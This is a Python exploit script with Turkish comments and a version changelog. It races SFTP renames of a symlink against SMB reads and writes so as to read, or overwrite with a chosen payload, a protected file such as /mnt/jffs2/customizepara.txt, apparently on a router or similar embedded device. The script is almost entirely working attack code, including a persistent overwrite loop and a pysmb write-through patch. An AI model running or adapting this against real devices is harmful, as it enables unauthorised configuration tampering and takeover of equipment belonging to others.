# HekzOntRace yariscisi v10 — okuma + YAZMA modu
# v10 degisiklikler (v9 uzerine):
#   - loop_yazar: fis cekilince (cihaz gider) OSError/SMBTimeout yakalanir,
#     5 ardisik baglanti hatasinda LDEAD ile TEMIZ cikis (traceback crash yok)
#   - WLOOP her basarili yazmada gonderilir ("0 yazma" yanilsamasi bitti)
# Okuma: python race_helper.py <ip> <share> <smbuser> <smbpass> <sftpport> <sftpuser> <sftppass> <minlen> <maxlen> <saniye> <hedef>
# Yazma: ...ayni argumanlar... <payload_dosyasi>
# v9 degisiklikler (v8 uzerine):
#   - _hata_ozeti artik baglama duyarli: direct/lnk.bin "Unable to open file" =
#     "daemon dosyayi kilitledi (normal)", race/cur.bin "Write failed" =
#     "rename ile cakisma (normal)" — yarisin beklenen davranisi etiketlenir
#   - "Failed to store \X on share: sebep" → "X: sebep" (share adi kirletilmez)
#   - connect() basarisizsa sleep'siz hot-loop yok (0.3 sn bekler)
# v8 degisiklikler:
#   - writer thread'leri arasi cur.bin mutex (cakisma giderildi)
#   - hata sayaci her SMB baglantisinda sifirlanir (sessiz yutma duzeltildi)
#   - nt_status yerine okunabilir hata ozeti (pysmb NTSTATUS erisilemez)
#   - direct/race yazma hatalari tek satirda ozet gosterir, tekrar sayar
import sys, io, time, base64, threading, re
import paramiko
from smb.SMBConnection import SMBConnection

# v11: SMB2 WRITE_THROUGH bayragi — sunucu yanit vermeden diske flush etmesi icin
try:
    from smb import smb2_structs as _s2
    _orig_winit = _s2.SMB2WriteRequest.__init__
    def _wt_init(self, fid, data, offset, remaining_len=0, flags=0):
        _orig_winit(self, fid, data, offset, remaining_len, flags | 1)
    _s2.SMB2WriteRequest.__init__ = _wt_init
    _WT = True
except Exception:
    _WT = False

ip, share, smbuser, smbpass = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
sftpport, sftpuser, sftppass = int(sys.argv[5]), sys.argv[6], sys.argv[7]
minlen, maxlen = int(sys.argv[8]), int(sys.argv[9])
sure = float(sys.argv[10]) if len(sys.argv) > 10 else 600
target = sys.argv[11] if len(sys.argv) > 11 else "/mnt/jffs2/customizepara.txt"
payload = open(sys.argv[12], "rb").read() if len(sys.argv) > 12 else None
loop_mod = (len(sys.argv) > 13 and sys.argv[13] == "loop")

found = threading.Event()
result = []
# cur.bin mutex: ayni anda sadece 1 race thread yazsin (rename ile cakismasin)
_cur_lock = threading.Lock()

def sf_baglan():
    for deneme in range(10):
        try:
            tr = paramiko.Transport((ip, sftpport))
            tr.connect(username=sftpuser, password=sftppass)
            return paramiko.SFTPClient.from_transport(tr), tr
        except Exception:
            time.sleep(1.5)
    raise Exception("SFTP baglanamadi")

def onar(sf):
    try: sf.remove("cur.bin")
    except Exception: pass
    try: sf.lstat("real.bin")
    except Exception:
        try:
            with sf.open("real.bin", "w") as f: f.write("R")
        except Exception: pass
    try: sf.lstat("lnk.bin")
    except Exception:
        try: sf.symlink(target, "lnk.bin")
        except Exception: pass

def renamer():
    sf, tr = sf_baglan()
    onar(sf)
    while not found.is_set() and time.time() - t0 < sure:
        try:
            sf.rename("lnk.bin", "cur.bin")
            sf.rename("cur.bin", "lnk.bin")
            sf.rename("real.bin", "cur.bin")
            sf.rename("cur.bin", "real.bin")
        except Exception:
            try: onar(sf)
            except Exception:
                try: tr.close()
                except Exception: pass
                time.sleep(1)
                try: sf, tr = sf_baglan(); onar(sf)
                except Exception: time.sleep(2)

def reader(i):
    hedef_dosya = "/lnk.bin" if payload is not None else "/cur.bin"
    while not found.is_set() and time.time() - t0 < sure:
        try:
            conn = SMBConnection(smbuser, smbpass, "", "*", use_ntlm_v2=True, is_direct_tcp=True)
            if not conn.connect(ip, 445, timeout=8):
                time.sleep(0.3); continue
            while not found.is_set() and time.time() - t0 < sure:
                buf = io.BytesIO()
                try:
                    conn.retrieveFile(share, hedef_dosya, buf, timeout=6)
                    d = buf.getvalue()
                    if payload is None:
                        if len(d) >= minlen and len(d) <= maxlen and d[:1] != b"R":
                            result.append(d); found.set(); return
                    else:
                        if d == payload:
                            result.append(d); found.set(); return
                except Exception:
                    pass
            try: conn.close()
            except Exception: pass
        except Exception:
            time.sleep(0.2)

def _hata_ozeti(e, mod=""):
    """pysmb exception'indan KISA ve ANLAMLI mesaj uretir.
    pysmb NTSTATUS'u guvenilir tasimadigi icin ('?') ham exception metninden
    okunabilir ozet cikarir ve yarisin NORMAL davranisini etiketler."""
    msg = str(e)
    # pysmb str(e) = "('mesaj', [yanit_listesi])" biciminde — sadece mesaji al
    m0 = re.match(r"^\('(.*)',\s*\[", msg, re.S)
    if m0: msg = m0.group(1)
    # repr formati: "OperationFailure('mesaj', [...])"
    m = re.search(r"OperationFailure\('([^']+)'", msg)
    if m: msg = m.group(1)
    temiz = msg[:160]
    # "Failed to store \lnk.bin on usb-XXXX: Unable to open file" → "lnk.bin: Unable to open file"
    m2 = re.search(r"Failed to store\s+\\*([^\s]+)\s+on\s+\S+:\s*(.+)", temiz)
    if m2:
        temiz = m2.group(1) + ": " + m2.group(2)
    # baglam ipucu: bunlar yarisin BEKLENEN davranisi, kod hatasi degil
    # NOT: yazdirilan tum mesajlar ASCII olmali — C# pipe'i cp1254 olabilir,
    # Unicode karakter print'i UnicodeEncodeError ile dusurebilir
    if mod and ("Unable to open file" in temiz or "Write failed" in temiz):
        if mod == "direct":
            temiz += " | lnk.bin(symlink->jffs2) daemon kilitli - yaris normal, deniyor"
        elif mod == "race":
            temiz += " | cur.bin rename ile cakisti - yaris normal, deniyor"
    return temiz

def writer(i):
    mod = "direct" if i == 0 else "race"
    # direct: lnk.bin (symlink → jffs2) | race: cur.bin (rename yarisi)
    hedef = "/lnk.bin" if mod == "direct" else "/cur.bin"
    ilk_ok = False
    while not found.is_set() and time.time() - t0 < sure:
        try:
            conn = SMBConnection(smbuser, smbpass, "", "*", use_ntlm_v2=True, is_direct_tcp=True)
            if not conn.connect(ip, 445, timeout=8):
                time.sleep(0.3); continue
            # her yeni baglantida hata durumu sifirlanir
            son_hata_msg = None
            tekrar_say = 0
            while not found.is_set() and time.time() - t0 < sure:
                try:
                    if mod == "race":
                        # cur.bin: ayni anda sadece 1 thread yazsin (renamer ile cakismasin)
                        with _cur_lock:
                            conn.storeFile(share, hedef, io.BytesIO(payload), timeout=10)
                    else:
                        conn.storeFile(share, hedef, io.BytesIO(payload), timeout=10)
                    if not ilk_ok:
                        ilk_ok = True
                        print("WOK:" + mod, flush=True)
                    son_hata_msg = None
                    tekrar_say = 0
                except Exception as e:
                    ozet = _hata_ozeti(e, mod)
                    if ozet == son_hata_msg:
                        tekrar_say += 1
                        # ayni hata ise her 10 tekrarda bir kisa hatirlatma
                        if tekrar_say % 10 == 0:
                            print("WERR:" + mod + ":Ayni hata " + str(tekrar_say) + "x tekrar: " + ozet, flush=True)
                    else:
                        # yeni/farkli hata → her zaman logla (sessiz yutma YOK)
                        if son_hata_msg and tekrar_say > 0:
                            print("WERR:" + mod + ":... onceki " + str(tekrar_say) + "x tekrar etti", flush=True)
                        son_hata_msg = ozet
                        tekrar_say = 0
                        print("WERR:" + mod + ":" + ozet, flush=True)
                    time.sleep(0.3)
            try: conn.close()
            except Exception: pass
        except Exception:
            time.sleep(0.2)

# Hizli SMB kimlik dogrulamasi
_smb_ok = False
for _d in range(3):
    try:
        _c = SMBConnection(smbuser, smbpass, "", "chk", use_ntlm_v2=True, is_direct_tcp=True)
        if _c.connect(ip, 445, timeout=6): _smb_ok = True; _c.close(); break
    except Exception: pass
    time.sleep(1)
if not _smb_ok:
    print("SMBFAIL", flush=True)
    raise SystemExit(1)

def loop_yazar():
    print("WT:" + str(_WT), flush=True)
    # Surdurulebilir yazma: lnk.bin'i surekli yaz, her yazmada geri oku, durumu bildir
    conn = SMBConnection(smbuser, smbpass, "", "lp", use_ntlm_v2=True, is_direct_tcp=True)
    if not conn.connect(ip, 445, timeout=8):
        print("SMBFAIL", flush=True); raise SystemExit(1)
    n = 0
    son_durum = -1
    son_hata = None
    hata_tek = 0
    baglanti_hata = 0
    while time.time() - t0 < sure:
        try:
            conn.storeFile(share, "/lnk.bin", io.BytesIO(payload), timeout=10)
            n += 1
            son_hata = None
            hata_tek = 0
            baglanti_hata = 0
            print("WLOOP:" + str(n), flush=True)
            for _ek in ("/lnk2.bin", "/lnk3.bin"):
                try: conn.storeFile(share, _ek, io.BytesIO(payload), timeout=10)
                except Exception: pass
        except SystemExit:
            raise
        except Exception as e:
            ozet = _hata_ozeti(e, "loop")
            if ozet != son_hata:
                if son_hata and hata_tek > 0:
                    print("WERR:loop:... onceki " + str(hata_tek) + "x tekrar", flush=True)
                son_hata = ozet
                hata_tek = 0
                print("WERR:loop:" + ozet, flush=True)
            else:
                hata_tek += 1
            try: conn.close()
            except Exception: pass
            time.sleep(0.4)
            # yeniden baglan — cihaz gittiyse (fis cekildi) OSError/SMBTimeout burada:
            # yakalanmali, CRASH DEGIL temiz cikis (v10 duzeltmesi)
            try:
                conn = SMBConnection(smbuser, smbpass, "", "lp2", use_ntlm_v2=True, is_direct_tcp=True)
                if conn.connect(ip, 445, timeout=8): baglanti_hata = 0
                else: baglanti_hata += 1
            except Exception:
                baglanti_hata += 1
            if baglanti_hata >= 5:
                print("LDEAD", flush=True)  # cihaz erisilemez — fis cekildi; temiz cikis
                raise SystemExit(0)
            time.sleep(1)
            continue
        try:
            buf = io.BytesIO()
            conn.retrieveFile(share, "/lnk.bin", buf, timeout=6)
            bizde = buf.getvalue() == payload
            if bizde != son_durum:
                son_durum = bizde
                print(("WSTAT:1" if bizde else "WSTAT:0"), flush=True)
        except Exception:
            pass
        time.sleep(0.12)
    print("LDONE", flush=True)

t0 = time.time()
if loop_mod:
    loop_yazar()
    raise SystemExit(0)
threading.Thread(target=renamer, daemon=True).start()
if payload is None:
    for i in range(4):
        threading.Thread(target=reader, args=(i,), daemon=True).start()
else:
    for i in range(3):
        threading.Thread(target=writer, args=(i,), daemon=True).start()
    for i in range(2):
        threading.Thread(target=reader, args=(50 + i,), daemon=True).start()
while not found.is_set() and time.time() - t0 < sure:
    time.sleep(0.5)
if result:
    print(("WROTE:" if payload else "FOUND:") + base64.b64encode(result[0]).decode(), flush=True)
else:
    print("TIMEOUT", flush=True)
